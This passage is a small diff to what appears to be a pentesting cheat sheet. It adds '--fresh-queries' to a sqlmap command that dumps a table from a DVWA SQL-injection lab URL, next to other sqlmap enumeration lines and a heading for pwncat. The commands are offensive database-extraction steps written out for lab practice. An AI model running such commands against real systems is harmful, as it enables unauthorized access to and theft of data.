@@ -353,7 +353,7 @@ sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Subm
 --form --dbs
 --form --tables -D [database]
 --form --columns -D [database] -T [table]
---form --dump -D [database] -T [table]
+--form --dump -D [database] -T [table] --fresh-queries
 ```
 
 ## pwncat
